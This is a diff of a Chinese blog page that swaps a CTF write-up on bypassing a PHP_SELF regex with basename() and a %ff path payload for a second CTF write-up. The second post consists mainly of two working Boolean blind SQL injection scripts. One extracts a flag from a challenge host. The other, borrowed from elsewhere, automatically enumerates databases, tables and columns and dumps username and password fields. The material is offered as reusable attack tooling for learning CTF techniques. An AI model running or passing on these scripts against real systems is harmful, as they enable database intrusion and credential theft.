@@ -26,7 +26,7 @@
 <link rel="shortcut icon" href="/images/favicon.png">
 
 
-<title>日常练习34——关于$ _server[&#39;ph _self&#39;])和basename函数 - Hexo</title>
+<title>日常练习33——盲注脚本 - Hexo</title>
 
 <meta name="keywords" content="">
 
@@ -149,100 +149,231 @@
                 <p><span class="label">Author</span>
                     <a href="https://george186.github.io"
                        target="_blank">george</a>
-                    <span title="Last edited at&nbsp;2021-05-14">2021-05-14</span>
+                    <span title="Last edited at&nbsp;2021-05-13">2021-05-13</span>
                 </p>
                 <p>一个写代码的「伪文人」</p>
             </div>
-            <h2 class="post-title">日常练习34——关于$ _SERVER['PH _SELF'])和basename函数</h2>
+            <h2 class="post-title">日常练习33——盲注脚本</h2>
             <div class="post-meta">
-                emm... 3395 words in the article |
+                emm... 7836 words in the article |
                 you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
             </div>
         </div>
         <div class="post-content markdown-body">
-            <p>这道题是一个关于一个php函数和新的变量属性的新知识点，积累一下。  </p>
-<h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h1><p>打开题目，发现让我们猜东西，猜到才能给flag，并且提供了源码。我们先审计源码：  </p>
-<pre><code>&lt;?php
-include &#39;config.php&#39;; // FLAG is defined in config.php
+            <p>做了一道经典的盲注题目，积累一个这种类型盲注的脚本。  </p>
+<h1 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h1><p>进入题目发现是查询成绩的界面：  </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/60a3ca8b6ae4f77d35de35c5.png"><img src="https://pic.imgdb.cn/item/60a3ca8b6ae4f77d35de35c5.png"></a>  </p>
+<p>我们分别输入1，2，3知道5都是有回显的，后面的学号就没有回显了，我们输入1^1^1和1^2^1来测试是否存在盲注。  </p>
+<p>发现回显不同并成功返回，说明存在盲注，而这个只过滤了空格，这里用括号代替，接下来就是上脚本。  </p>
+<pre><code># -*- coding: utf-8 -*-
+# @Author: jiaoben
+# @Date  :  2020/05/03
 
-if (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;
-  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);
-&#125;
-
-if (isset($_GET[&#39;source&#39;])) &#123;
-  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));
-  exit();
-&#125;
-
-$secret = bin2hex(random_bytes(64));
-if (isset($_POST[&#39;guess&#39;])) &#123;
-  $guess = (string) $_POST[&#39;guess&#39;];
-  if (hash_equals($secret, $guess)) &#123;
-$message = &#39;Congratulations! The flag is: &#39; . FLAG;
-&#125; else &#123;
-$message = &#39;Wrong.&#39;;
-  &#125;
-&#125;  </code></pre>
-<p>可以看到让我猜东西的代码如下：  </p>
-<pre><code>$secret = bin2hex(random_bytes(64));
-if (isset($_POST[&#39;guess&#39;])) &#123;
-  $guess = (string) $_POST[&#39;guess&#39;];
-  if (hash_equals($secret, $guess)) &#123;
-$message = &#39;Congratulations! The flag is: &#39; . FLAG;
-&#125; else &#123;
-$message = &#39;Wrong.&#39;;
-  &#125;
-&#125;  </code></pre>
-<p>这里random_bytes( int $length)函数是生成指定大小的随机字符串（单位：字节），然后bin2hex()函数将生成的ASCII字符串转换为16进制，它让我们猜的就是这一串十六进制字符。且对比时采用了php 可防止时序攻击的字符串比较函数 hash _equals()。也就是说明，我们不可能在猜字符串这里下手脚了，猜是猜不到的。  </p>
-<p>那么我们就重点放在前面的代码：  </p>
-<pre><code>include &#39;config.php&#39;; // FLAG is defined in config.php
-
-if (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;
-  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);
-&#125;
-
-if (isset($_GET[&#39;source&#39;])) &#123;
-  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));
-  exit();
-&#125;  </code></pre>
-<p>这段代码中有两个之前没见过的重要信息：  </p>
-<p>第一个是属性$ _SERVER[‘PHP _SELF’]，这个表示当前 php 文件相对于网站根目录的位置地址，与 document root 相关，如下图的测试：  </p>
-<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/60a681e26ae4f77d35fcf609.png"><img src="https://pic.imgdb.cn/item/60a681e26ae4f77d35fcf609.png"></a>  </p>
-<p>第二个就是basename()函数，这个函数会返回路径中的文件名部分假如路径是/index.php/config.php，浏览器的解析结果都是index.php，而basename会返回config.php，就算后面跟上多余的字符也会返回文件名部分，比如test.php/?source仍会返回文件名test.php。  </p>
-<p>而basename()函数存在一个问题，那就是他会去掉文件名开头的非ASCII值，比如下面两个例子：  </p>
-<pre><code>var_dump(basename(&quot;xffconfig.php&quot;)); // =&gt; config.php
-var_dump(basename(&quot;config.php/xff&quot;)); // =&gt; config.php</code></pre>
-<p>在代码的一开头就已经告诉我们了flag在config.php里，如果我们想要读取到这个文件，就要get上传参数source，并且我们的路径里的文件名必须是config.php。</p>
-<pre><code>if (isset($_GET[&#39;source&#39;])) &#123;
-  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));
-  exit();
-&#125;  </code></pre>
-<p>但是一开始就有一个正则匹配：  </p>
-<pre><code>if (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;
-  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);
-&#125;</code></pre>
-<p>我们观察这个匹配，/config.php/*$/i表示匹配的是字符串尾部，对config.php这个字符进行匹配，匹配的字符串是文件路径，那也就是说，我们不能直接上传payload的文件路径为：</p>
-<pre><code>/index.php/config.php/?source  </code></pre>
-<p>因为这样会被直接过滤，那么我们可以利用basename()函数会去掉文件名开头的非ASCII值这一漏洞，这样构造：  </p>
-<pre><code>/index.php/config.php/%ff?source  </code></pre>
-<p>这里的%ff就是非ASCII值，这样构造的payload既满足了有变量source上传，能够执行读取文件的代码，又能成功返回正确的文件名config.php(因为%ff会被去掉，?source不会影响返回文件名)，最重要的是绕过了正则匹配，因为它会匹配的是**%ff?source**这一段，从而绕过了对config.php的匹配。  </p>
-<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/60a6927d6ae4f77d35a5304c.png"><img src="https://pic.imgdb.cn/item/60a6927d6ae4f77d35a5304c.png"></a>  </p>
-<p>得到config.php的内容。  </p>
-<p>下面附上关于fuzz脚本，用来测试那些字符不会被过滤，同时构造满足条件的payload：  </p>
-<pre><code>import requests
 import re
+import requests
+import string
 
-for i in range(0,255):
-url =&#39;http://cc5b962c-30fd-4564-a182-23f81878af5a.node3.buuoj.cn/index.php/config.php/&#123;&#125;?source&#39;.format(chr(i))
-print(url)
-r = requests.get(url)
-flag = re.findall(&quot;flag\&#123;.*?\&#125;&quot;, r.text)
-if flag:
+url = &quot;http://f2301815-d05c-45da-a70a-91600495a2c2.node3.buuoj.cn/&quot;
+flag = &#39;&#39;
+
+
+def payload(i, j):
+# 数据库名字
+# sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)
+# 表名
+# sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#39;ctf&#39;),%d,1))&gt;%d)^1&quot;%(i,j)
+# 列名
+# sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),%d,1))&gt;%d)^1&quot;%(i,j)
+# 查询flag
+sql = &quot;1^(ord(substr((select(group_concat(value))from(ctf.flag)),%d,1))&gt;%d)^1&quot; % (i, j)
+data = &#123;&quot;stunum&quot;: sql&#125; //这里修改注入的id
+r = requests.get(url, params=data)
+# print (r.url)
+if &quot;Hi admin, your score is: 100&quot; in r.text:
+    res = 1
+else:
+    res = 0
+return res
+
+
+def exp():
+global flag
+for i in range(1, 10000):
+    print(i, &#39;:&#39;)
+    low = 32
+    high = 128
+    while low &lt;= high:
+        mid = (low + high) // 2
+        res = payload(i, mid)
+        if res:
+            low = mid + 1
+        else:
+            high = mid - 1
+    f = int((low + high +1)) // 2
+    if (f == 132 or f == 32):
+        break
+    # print (f)
+    flag += chr(f)
     print(flag)
-    break</code></pre>
-<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题就是两个关于php的新知识，比较重要的就是basename()函数的一些问题，当作积累就好了。  </p>
-<p>附上basename()函数的漏洞官网：  </p>
-<p><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=62119">basename()函数</a></p>
+
+
+exp()
+print(&#39;flag=&#39;, flag)</code></pre>
+<p>直接就能得到flag。  </p>
+<p>下面附上找到的网上的另一个比较全的python脚本  </p>
+<pre><code># -*- coding:utf-8 -*-
+# Author: mochu7
+import requests
+
+def ascii_str():#生成库名表名字符所在的字符列表字典
+str_list=[]
+for i in range(33,127):#所有可显示字符
+    str_list.append(chr(i))
+#print(&#39;可显示字符：%s&#39;%str_list)
+return str_list#返回字符列表
+
+def db_length(url,str):
+print(&quot;[-]开始测试数据库名长度.......&quot;)
+num=1
+while True:
+    db_payload=url+&quot;&#39; and (length(database())=%d)--+&quot;%num
+    r=requests.get(db_payload)
+    if str in r.text:
+        db_length=num
+        print(&quot;[+]数据库长度：%d\n&quot;%db_length)
+        db_name(db_length)#进行下一步，测试库名
+        break
+    else:
+        num += 1
+
+def db_name(db_length):
+print(&quot;[-]开始测试数据库名.......&quot;)
+db_name=&#39;&#39;
+str_list=ascii_str()
+for i in range(1,db_length+1):
+    for j in str_list:
+        db_payload=url+&quot;&#39; and (ord(mid(database(),%d,1))=&#39;%s&#39;)--+&quot;%(i,ord(j))
+        r=requests.get(db_payload)
+        if str in r.text:
+            db_name+=j
+            break
+print(&quot;[+]数据库名：%s\n&quot;%db_name)
+tb_piece(db_name)#进行下一步，测试security数据库有几张表
+return db_name
+
+def tb_piece(db_name):
+print(&quot;开始测试%s数据库有几张表........&quot;%db_name)
+for i in range(100):#猜解库中有多少张表，合理范围即可
+    tb_payload=url+&quot;&#39; and %d=(select count(table_name) from information_schema.tables where table_schema=&#39;%s&#39;)--+&quot;%(i,db_name)
+    r=requests.get(tb_payload)
+    if str in r.text:
+        tb_piece=i
+        break
+print(&quot;[+]%s库一共有%d张表\n&quot;%(db_name,tb_piece))
+tb_name(db_name,tb_piece)#进行下一步，猜解表名
+
+
+def tb_name(db_name,tb_piece):
+print(&quot;[-]开始猜解表名.......&quot;)
+table_list=[]
+for i in range(tb_piece):
+    str_list=ascii_str()
+    tb_length=0
+    tb_name=&#39;&#39;
+    for j in range(1,20):#表名长度，合理范围即可
+        tb_payload=url+&quot;&#39; and (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d--+&quot;%(i,j)
+        r=requests.get(tb_payload)
+        if str in r.text:
+            tb_length=j
+            print(&quot;第%d张表名长度：%s&quot;%(i+1,tb_length))
+            for k in range(1,tb_length+1):#根据表名长度进行截取对比
+                for l in str_list:
+                    tb_payload=url+&quot;&#39; and (select ord(mid((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)))=%d--+&quot;%(i,k,ord(l))
+                    r=requests.get(tb_payload)
+                    if str in r.text:
+                        tb_name+=l
+            print(&quot;[+]：%s&quot;%tb_name)
+            table_list.append(tb_name)
+            break
+print(&quot;\n[+]%s库下的%s张表：%s\n&quot;%(db_name,tb_piece,table_list))
+column_num(table_list,db_name)#进行下一步，猜解每张表的字段数
+
+def column_num(table_list,db_name):
+print(&quot;[-]开始猜解每张表的字段数：.......&quot;)
+column_num_list=[]
+for i in table_list:
+    for j in range(30):#每张表的字段数量，合理范围即可
+        column_payload=url+&quot;&#39; and %d=(select count(column_name) from information_schema.columns where table_name=&#39;%s&#39;)--+&quot;%(j,i)
+        r=requests.get(column_payload)
+        if str in r.text:
+            column_num=j
+            column_num_list.append(column_num)#把所有表的字段，依次放入这个列表当中
+            print(&quot;[+]%s表\t%s个字段&quot;%(i,column_num))
+            break
+print(&quot;\n[+]表对应的字段数：%s\n&quot;%column_num_list)
+column_name(table_list,column_num_list,db_name)#进行下一步，猜解每张表的字段名
+
+def column_name(table_list,column_num_list,db_name):
+print(&quot;[-]开始猜解每张表的字段名.......&quot;)
+column_length=[]
+str_list=ascii_str()
+column_name_list=[]
+for t in range(len(table_list)):#t在这里代表每张表的列表索引位置
+    print(&quot;\n[+]%s表的字段：&quot;%table_list[t])
+    for i in range(column_num_list[t]):#i表示每张表的字段数量
+        column_name=&#39;&#39;
+        for j in range(1,21):#j表示每个字段的长度
+            column_name_length=url+&quot;&#39; and %d=(select length(column_name) from information_schema.columns where table_name=&#39;%s&#39; limit %d,1)--+&quot;%(j-1,table_list[t],i)
+            r=requests.get(column_name_length)
+            if str in r.text:
+                column_length.append(j)
+                break
+            for k in str_list:#k表示我们猜解的字符字典
+                column_payload=url+&quot;&#39; and ord(mid((select column_name from information_schema.columns where table_name=&#39;%s&#39; limit %d,1),%d,1))=%d--+&quot;%(table_list[t],i,j,ord(k))
+                r=requests.get(column_payload)
+                if str in r.text:
+                    column_name+=k
+        print(&#39;[+]：%s&#39;%column_name)
+        column_name_list.append(column_name)
+#print(column_name_list)#输出所有表中的字段名到一个列表中
+dump_data(table_list,column_name_list,db_name)#进行最后一步，输出指定字段的数据
+
+def dump_data(table_list,column_name_list,db_name):
+print(&quot;\n[-]对%s表的%s字段进行爆破.......\n&quot;%(table_list[3],column_name_list[9:12]))
+str_list=ascii_str()
+for i in column_name_list[9:12]:#id,username,password字段
+    for j in range(101):#j表示有多少条数据，合理范围即可
+        data_num_payload=url+&quot;&#39; and (select count(%s) from %s.%s)=%d--+&quot;%(i,db_name,table_list[3],j)
+        r=requests.get(data_num_payload)
+        if str in r.text:
+            data_num=j
+            break
+    print(&quot;\n[+]%s表中的%s字段有以下%s条数据：&quot;%(table_list[3],i,data_num))
+    for k in range(data_num):
+        data_len=0
+        dump_data=&#39;&#39;
+        for l in range(1,21):#l表示每条数据的长度，合理范围即可
+            data_len_payload=url+&quot;&#39; and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+&quot;%(i,db_name,table_list[3],k,l)
+            r=requests.get(data_len_payload)
+            if str not in r.text:
+                data_len=l-1
+                for x in range(1,data_len+1):#x表示每条数据的实际范围，作为mid截取的范围
+                    for y in str_list:
+                        data_payload=url+&quot;&#39; and ord(mid((select %s from %s.%s limit %d,1),%d,1))=%d--+&quot;%(i,db_name,table_list[3],k,x,ord(y))
+                        r=requests.get(data_payload)
+                        if str in r.text:
+                            dump_data+=y
+                            break
+                break
+        print(&#39;[+]%s&#39;%dump_data)#输出每条数据
+
+
+
+if __name__ == &#39;__main__&#39;:
+url=&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;#目标url
+str=&quot;You are in&quot;#布尔型盲注的true&amp;false的判断因素
+db_length(url,str)#程序入口</code></pre>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>一般的盲注题目，也没有过滤什么，有脚本就很简单。  </p>
 
             
                 
